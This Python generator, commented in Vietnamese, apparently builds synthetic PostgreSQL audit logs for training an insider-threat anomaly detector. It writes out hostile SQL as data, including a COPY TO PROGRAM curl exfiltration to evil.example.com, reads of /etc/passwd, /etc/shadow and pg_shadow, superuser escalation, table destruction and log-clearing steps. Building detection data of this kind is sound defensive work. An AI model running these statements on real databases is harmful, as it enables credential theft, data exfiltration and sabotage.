#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack.py (v13.0 - KILL CHAIN THEO CERT v4.2)
==============================================
Mỗi kịch bản được chia thành 5 PHASE theo kill chain:
  Phase 0 — RECON       : quét schema, đếm rows, xem quyền
  Phase 1 — PREPARATION : tạo bảng tạm, gom data nhỏ, test COPY
  Phase 2 — EXECUTION   : bulk export, COPY ra file, INSERT hàng loạt
  Phase 3 — COVER       : DROP bảng tạm, DELETE logs, dọn dấu vết

Mỗi phase được gọi riêng biệt từ build script → user thực hiện
từng phase trên từng ngày/frame khác nhau → model học được
escalation pattern theo thời gian.

Nhãn is_anomaly:
  - Phase RECON trở đi = 1  (toàn bộ chuỗi tính là bất thường)
  - Ngày trước khi recon   = 0  (hoàn toàn bình thường)
"""

import random

# =====================================================================
# PHASE CONSTANTS
# =====================================================================
PHASE_RECON       = "recon"
PHASE_PREPARATION = "preparation"
PHASE_EXECUTION   = "execution"
PHASE_COVER       = "cover"

KILL_CHAIN_PHASES = [PHASE_RECON, PHASE_PREPARATION, PHASE_EXECUTION, PHASE_COVER]

SCENARIOS = {
    1:  "Data_Exfiltration",
    2:  "Privilege_Escalation",
    3:  "Data_Sabotage",
    4:  "Account_Hijacking",
    5:  "Slow_Rate_Exfiltration",
    6:  "Off_Hours_Activity",
    7:  "SQL_Injection_Attempt",
    8:  "Lateral_Movement",
    9:  "Data_Staging",
    10: "Credential_Abuse",
}

# =====================================================================
# HELPER
# =====================================================================
_SYSTEM_TABLES = {"pg_catalog", "pg_shadow", "pg_roles", "pg_class",
                  "pg_namespace", "pg_locks", "pg_stat_activity",
                  "information_schema.columns"}

def _build_record(user, statement, tbl, status, rows,
                  frame, is_after_hours, sid, phase) -> dict:
    if 'pg_' in tbl or tbl.startswith('information_schema') or tbl in _SYSTEM_TABLES:
        tbl = "system_catalog"
    return {
        "db_user":         user,
        "sql_statement":   statement,
        "tables_involved": tbl,
        "status":          status,
        "rows_affected":   rows,
        "graph_frame":     frame,
        "is_after_hours":  is_after_hours,
        "scenario_type":   SCENARIOS[sid],
        "attack_phase":    phase,      # recon / preparation / execution / cover
    }


def get_phase_sequence(user, frame, is_after_hours, scenario_id, phase, steps):
    """
    Sinh các SQL record cho MỘT phase cụ thể của scenario.
    Được gọi lần lượt từ build script: recon → preparation → execution → cover.
    """
    fn = _PHASE_HANDLERS.get((scenario_id, phase))
    if fn is None:
        # fallback nếu scenario chưa có phase này
        fn = _generic_phase(phase)
    return fn(user, frame, is_after_hours, scenario_id, steps)


# =====================================================================
# SCENARIO 1 — Data Exfiltration
# =====================================================================
def _s1_recon(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "partsupp"])
    pool = [
        f"SELECT COUNT(*) FROM public.{tbl};",
        f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='{tbl}';",
        f"SELECT * FROM public.{tbl} LIMIT 5;",
        f"SELECT relname, reltuples FROM pg_class WHERE relname='{tbl}';",
        f"SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
        f"SELECT * FROM pg_indexes WHERE tablename='{tbl}';",
        f"SELECT pg_size_pretty(pg_total_relation_size('public.{tbl}'));",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(1, 20), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s1_preparation(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem"])
    pool = [
        f"SELECT * FROM public.{tbl} LIMIT 1000;",
        f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key < 5000 LIMIT 500;",
        f"CREATE TEMP TABLE _stage AS SELECT * FROM public.{tbl} LIMIT 1000;",
        f"SELECT COUNT(*) FROM public.{tbl} WHERE 1=1;",
        f"SELECT * FROM public.{tbl} ORDER BY 1 LIMIT 200;",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(200, 1000), frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s1_execution(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "partsupp"])
    pool = [
        f"SELECT * FROM public.{tbl} ORDER BY 1 DESC LIMIT {random.randint(200_000, 1_200_000)};",
        f"COPY public.{tbl} TO '/tmp/export_{tbl}.csv' DELIMITER ',' CSV HEADER;",
        f"SELECT * FROM public.{tbl} WHERE 1=1 LIMIT {random.randint(300_000, 900_000)};",
        f"SELECT c.c_name, o.o_totalprice FROM public.customer c JOIN public.orders o ON c.c_custkey=o.o_custkey LIMIT {random.randint(100_000, 500_000)};",
        f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > {random.randint(1,1000)} ORDER BY 1 LIMIT {random.randint(200_000, 800_000)};",
        f"COPY (SELECT * FROM public.{tbl} LIMIT 500000) TO '/tmp/{tbl}_dump.csv' CSV HEADER;",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(100_000, 1_200_000), frame, ah, sid, PHASE_EXECUTION)
            for i in range(steps)]

def _s1_cover(user, frame, ah, sid, steps):
    pool = [
        "DROP TABLE IF EXISTS _stage;",
        "DELETE FROM pg_stat_activity WHERE state='idle';",
        "SELECT pg_stat_reset();",
        "DISCARD ALL;",
        "SET search_path TO public; SELECT 1;",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", 0, frame, ah, sid, PHASE_COVER)
            for i in range(steps)]


# =====================================================================
# SCENARIO 2 — Privilege Escalation
# =====================================================================
def _s2_recon(user, frame, ah, sid, steps):
    pool = [
        "SELECT relname, relacl FROM pg_class WHERE relkind='r';",
        "SELECT usename, usesuper, usecreatedb FROM pg_user;",
        "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='salary_details';",
        "SELECT * FROM pg_roles WHERE rolsuper = true;",
        "SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='salary_details';",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", random.randint(5, 30), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s2_preparation(user, frame, ah, sid, steps):
    pool = [
        f"SELECT * FROM public.salary_details WHERE salary > 50000000;",
        f"GRANT SELECT ON TABLE public.salary_details TO {user};",
        f"GRANT ALL PRIVILEGES ON TABLE public.salary_details TO {user};",
    ]
    statuses = ["PERMISSION DENIED", "PERMISSION DENIED", "SUCCESS"]
    return [_build_record(user, pool[i % len(pool)], "salary_details",
                          statuses[i % len(statuses)], 0, frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s2_execution(user, frame, ah, sid, steps):
    pool = [
        f"ALTER ROLE {user} SUPERUSER;",
        f"UPDATE public.salary_details SET salary = salary * 3 WHERE db_user = '{user}';",
        f"REVOKE ALL ON ALL TABLES IN SCHEMA public FROM PUBLIC; GRANT ALL TO {user};",
        f"SELECT * FROM public.salary_details LIMIT 1000;",
    ]
    statuses = ["PERMISSION DENIED", "SUCCESS", "PERMISSION DENIED", "SUCCESS"]
    return [_build_record(user, pool[i % len(pool)], "salary_details",
                          statuses[i % len(statuses)],
                          random.randint(0, 500), frame, ah, sid, PHASE_EXECUTION)
            for i in range(steps)]

def _s2_cover(user, frame, ah, sid, steps):
    pool = [
        f"REVOKE ALL ON TABLE public.salary_details FROM {user};",
        f"ALTER ROLE {user} NOSUPERUSER;",
        "SELECT pg_stat_reset();",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", 0, frame, ah, sid, PHASE_COVER)
            for i in range(steps)]


# =====================================================================
# SCENARIO 3 — Data Sabotage
# =====================================================================
def _s3_recon(user, frame, ah, sid, steps):
    tbl = random.choice(["orders", "lineitem", "salary_details", "customer"])
    pool = [
        f"SELECT COUNT(*) FROM public.{tbl};",
        f"SELECT * FROM public.{tbl} LIMIT 10;",
        f"SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}';",
        f"SELECT pg_size_pretty(pg_total_relation_size('public.{tbl}'));",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(1, 20), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s3_preparation(user, frame, ah, sid, steps):
    tbl = random.choice(["orders", "lineitem", "salary_details"])
    pool = [
        f"SELECT * FROM public.{tbl} LIMIT 100;",
        f"SELECT {tbl[:2]}_key FROM public.{tbl} WHERE {tbl[:2]}_key > 0 LIMIT 500;",
        f"BEGIN; SELECT * FROM public.{tbl} FOR UPDATE LIMIT 10; ROLLBACK;",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(10, 100), frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s3_execution(user, frame, ah, sid, steps):
    tbl = random.choice(["orders", "lineitem", "salary_details", "customer"])
    pool = [
        f"UPDATE public.{tbl} SET {tbl[:2]}_comment = NULL WHERE 1=1;",
        f"DELETE FROM public.{tbl} WHERE {tbl[:2]}_key > 0;",
        f"TRUNCATE TABLE public.{tbl};",
        f"DROP TABLE public.{tbl} CASCADE;",
        f"ALTER TABLE public.{tbl} DROP COLUMN {tbl[:2]}_comment;",
        f"UPDATE public.{tbl} SET {tbl[:2]}_key = {tbl[:2]}_key * -1 WHERE {tbl[:2]}_key > 0;",
    ]
    status = "SUCCESS" if random.random() < 0.65 else "PERMISSION DENIED"
    return [_build_record(user, pool[i % len(pool)], tbl, status,
                          random.randint(50_000, 1_500_000) if status == "SUCCESS" else 0,
                          frame, ah, sid, PHASE_EXECUTION)
            for i in range(steps)]

def _s3_cover(user, frame, ah, sid, steps):
    pool = [
        "SELECT pg_stat_reset();",
        "DISCARD ALL;",
        "SET search_path TO public; SELECT 1;",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", 0, frame, ah, sid, PHASE_COVER)
            for i in range(steps)]


# =====================================================================
# SCENARIO 9 — Data Staging (điển hình nhất cho kill chain)
# =====================================================================
def _s9_recon(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "salary_details"])
    pool = [
        f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name='{tbl}';",
        f"SELECT COUNT(*) FROM public.{tbl};",
        f"SELECT * FROM public.{tbl} LIMIT 5;",
        f"SELECT pg_size_pretty(pg_total_relation_size('public.{tbl}'));",
        f"SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(1, 20), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s9_preparation(user, frame, ah, sid, steps):
    tbl   = random.choice(["customer", "orders", "lineitem", "salary_details"])
    stage = f"tmp_stage_{random.randint(100, 999)}"
    pool  = [
        f"CREATE TEMP TABLE {stage} AS SELECT * FROM public.{tbl} LIMIT 80000;",
        f"INSERT INTO {stage} SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > 80000 LIMIT 40000;",
        f"SELECT COUNT(*) FROM {stage};",
        f"SELECT * FROM {stage} ORDER BY 1 LIMIT 100;",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl,
                          "SUCCESS", random.randint(1000, 80_000),
                          frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s9_execution(user, frame, ah, sid, steps):
    tbl   = random.choice(["customer", "orders", "lineitem", "salary_details"])
    stage = f"tmp_stage_{random.randint(100, 999)}"
    pool  = [
        f"COPY {stage} TO '/tmp/{stage}_part1.csv' CSV HEADER;",
        f"COPY {stage} TO '/tmp/{stage}_part2.csv' CSV HEADER DELIMITER E'\\t';",
        f"COPY (SELECT * FROM public.{tbl} LIMIT 200000) TO '/tmp/{tbl}_full.csv' CSV HEADER;",
        f"SELECT * FROM {stage} LIMIT 50000;",
    ]
    status = "SUCCESS" if random.random() < 0.7 else "PERMISSION DENIED"
    return [_build_record(user, pool[i % len(pool)], tbl, status,
                          random.randint(10_000, 200_000) if status == "SUCCESS" else 0,
                          frame, ah, sid, PHASE_EXECUTION)
            for i in range(steps)]

def _s9_cover(user, frame, ah, sid, steps):
    stage = f"tmp_stage_{random.randint(100, 999)}"
    pool  = [
        f"DROP TABLE IF EXISTS {stage};",
        "SELECT pg_stat_reset();",
        "DISCARD ALL;",
        "SET search_path TO public; SELECT 1;",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", 0, frame, ah, sid, PHASE_COVER)
            for i in range(steps)]


# =====================================================================
# SCENARIO 5 — Slow-Rate Exfiltration (trải dài, ít nổi bật mỗi ngày)
# =====================================================================
def _s5_recon(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem", "salary_details"])
    pool = [
        f"SELECT COUNT(*) FROM public.{tbl};",
        f"SELECT * FROM public.{tbl} LIMIT 10;",
        f"SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}';",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(1, 20), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s5_preparation(user, frame, ah, sid, steps):
    tbl = random.choice(["customer", "orders", "lineitem"])
    pool = [
        f"SELECT * FROM public.{tbl} LIMIT 3000 OFFSET 0;",
        f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > 0 LIMIT 2000;",
    ]
    return [_build_record(user, pool[i % len(pool)], tbl, "SUCCESS",
                          random.randint(1000, 3000), frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s5_execution(user, frame, ah, sid, steps):
    tbl     = random.choice(["customer", "orders", "lineitem", "salary_details"])
    offsets = [i * random.randint(2000, 5000) for i in range(steps)]
    pool_fn = [
        lambda off: f"SELECT * FROM public.{tbl} LIMIT 3000 OFFSET {off};",
        lambda off: f"SELECT * FROM public.{tbl} WHERE {tbl[:2]}_key > {off} LIMIT 2000;",
        lambda off: f"SELECT c.c_name, o.o_orderdate FROM public.customer c JOIN public.orders o ON c.c_custkey=o.o_custkey LIMIT 2000 OFFSET {off};",
    ]
    records = []
    for i in range(steps):
        fn   = pool_fn[i % len(pool_fn)]
        stmt = fn(offsets[i])
        records.append(_build_record(user, stmt, tbl, "SUCCESS",
                                     3000, frame, ah, sid, PHASE_EXECUTION))
    return records

def _s5_cover(user, frame, ah, sid, steps):
    return _s1_cover(user, frame, ah, sid, steps)


# =====================================================================
# SCENARIO 10 — Credential Abuse
# =====================================================================
def _s10_recon(user, frame, ah, sid, steps):
    pool = [
        "SELECT usename, passwd, valuntil FROM pg_shadow;",
        "SELECT * FROM pg_stat_activity WHERE usename != current_user;",
        "SELECT usename, usesuper FROM pg_user;",
        "SELECT rolname, rolsuper FROM pg_roles;",
    ]
    statuses = ["PERMISSION DENIED", "SUCCESS", "SUCCESS", "SUCCESS"]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          statuses[i % len(statuses)],
                          random.randint(0, 20), frame, ah, sid, PHASE_RECON)
            for i in range(steps)]

def _s10_preparation(user, frame, ah, sid, steps):
    pool = [
        "SET ROLE postgres; SELECT * FROM public.orders LIMIT 500;",
        "SET SESSION AUTHORIZATION postgres; SELECT * FROM public.salary_details;",
        "SELECT pg_read_file('/etc/passwd');",
        f"SELECT lo_get(lo_creat(-1));",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "PERMISSION DENIED" if random.random() < 0.4 else "SUCCESS",
                          random.randint(0, 200), frame, ah, sid, PHASE_PREPARATION)
            for i in range(steps)]

def _s10_execution(user, frame, ah, sid, steps):
    pool = [
        "ALTER USER postgres PASSWORD 'hacked123!';",
        "COPY public.salary_details TO PROGRAM 'curl -d @- https://evil.example.com';",
        "SET ROLE postgres; COPY public.orders TO '/tmp/full_orders.csv' CSV HEADER;",
        "SELECT * FROM public.salary_details JOIN public.customer ON TRUE LIMIT 200;",
        "SELECT pg_read_binary_file('/etc/shadow');",
    ]
    status = "PERMISSION DENIED" if random.random() < 0.35 else "SUCCESS"
    return [_build_record(user, pool[i % len(pool)], "salary_details", status,
                          random.randint(200, 3000) if status == "SUCCESS" else 0,
                          frame, ah, sid, PHASE_EXECUTION)
            for i in range(steps)]

def _s10_cover(user, frame, ah, sid, steps):
    pool = [
        "SELECT pg_stat_reset();",
        "SELECT pg_ls_dir('/var/lib/postgresql/data/');",
        "DISCARD ALL;",
    ]
    return [_build_record(user, pool[i % len(pool)], "system_catalog",
                          "SUCCESS", 0, frame, ah, sid, PHASE_COVER)
            for i in range(steps)]


# =====================================================================
# GENERIC FALLBACK cho các scenario chưa có phase riêng
# =====================================================================
def _generic_phase(phase):
    """Trả về handler generic nếu scenario chưa implement phase đó."""
    def _handler(user, frame, ah, sid, steps):
        tbl  = random.choice(["customer", "orders", "lineitem"])
        stmt = {
            PHASE_RECON:       f"SELECT COUNT(*) FROM public.{tbl};",
            PHASE_PREPARATION: f"SELECT * FROM public.{tbl} LIMIT 500;",
            PHASE_EXECUTION:   f"SELECT * FROM public.{tbl} LIMIT 100000;",
            PHASE_COVER:       "SELECT pg_stat_reset();",
        }.get(phase, f"SELECT 1;")
        return [_build_record(user, stmt, tbl, "SUCCESS",
                              random.randint(1, 1000), frame, ah, sid, phase)
                for _ in range(steps)]
    return _handler


# =====================================================================
# DISPATCH TABLE: (scenario_id, phase) → handler
# =====================================================================
_PHASE_HANDLERS = {
    (1,  PHASE_RECON):       _s1_recon,
    (1,  PHASE_PREPARATION): _s1_preparation,
    (1,  PHASE_EXECUTION):   _s1_execution,
    (1,  PHASE_COVER):       _s1_cover,

    (2,  PHASE_RECON):       _s2_recon,
    (2,  PHASE_PREPARATION): _s2_preparation,
    (2,  PHASE_EXECUTION):   _s2_execution,
    (2,  PHASE_COVER):       _s2_cover,

    (3,  PHASE_RECON):       _s3_recon,
    (3,  PHASE_PREPARATION): _s3_preparation,
    (3,  PHASE_EXECUTION):   _s3_execution,
    (3,  PHASE_COVER):       _s3_cover,

    (5,  PHASE_RECON):       _s5_recon,
    (5,  PHASE_PREPARATION): _s5_preparation,
    (5,  PHASE_EXECUTION):   _s5_execution,
    (5,  PHASE_COVER):       _s5_cover,

    (9,  PHASE_RECON):       _s9_recon,
    (9,  PHASE_PREPARATION): _s9_preparation,
    (9,  PHASE_EXECUTION):   _s9_execution,
    (9,  PHASE_COVER):       _s9_cover,

    (10, PHASE_RECON):       _s10_recon,
    (10, PHASE_PREPARATION): _s10_preparation,
    (10, PHASE_EXECUTION):   _s10_execution,
    (10, PHASE_COVER):       _s10_cover,
}
